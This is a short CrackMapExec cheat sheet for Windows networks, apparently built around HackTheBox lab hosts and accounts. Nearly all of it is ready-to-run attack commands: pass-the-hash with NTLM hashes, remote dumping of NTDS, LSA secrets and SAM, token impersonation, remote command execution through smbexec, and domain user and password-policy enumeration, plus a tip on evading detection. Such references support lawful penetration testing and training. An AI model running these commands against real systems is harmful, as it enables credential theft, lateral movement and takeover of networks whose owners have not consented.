# Crackmapexec

## CrackMapExec

CrackMapExec is a post-foothold tool used for lateral movement and privilege escalation. It can be used to dump the LSA, SAM, and perform Pass-the-Hash (PtH) attacks.

### Basic Usage

#### Using NTLM hash to authenticate and list shares

```bash
crackmapexec smb 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 --shares
```

#### Execute commands with hash

```bash
crackmapexec smb 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -x whoami
```

### Common Operations

#### Capturing the NTDS

```bash
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

#### Dumping LSA Secrets Remotely

```bash
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

#### Dumping SAM Remotely

```bash
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

### Token Manipulation

#### Using the tokens module

```bash
crackmapexec smb 192.168.1.100 -u Administrator -p 'Password123' -M tokens
```

#### Impersonating a user

```bash
crackmapexec smb 192.168.1.100 -u Administrator -p 'Password123' --impersonate-user domain\targetuser
```

### Command Execution

#### SMBEXEC Method

```bash
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

### User Enumeration

#### Enumerating Logged-on Users

```bash
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

### Advanced Techniques

#### Pass-the-Hash (PtH)

```bash
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

#### Getting Password Policies

```bash
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

#### Enumerating Domain Users

```bash
crackmapexec smb 172.16.5.5 --users
```

#### Using Valid Credentials to Enumerate Users

```bash
crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

### Tips

* Use `--continue-on-success` to continue after finding a good credential combo
* For mass scanning, consider rate-limiting to avoid detection
* Always test in controlled environments before using in real engagements
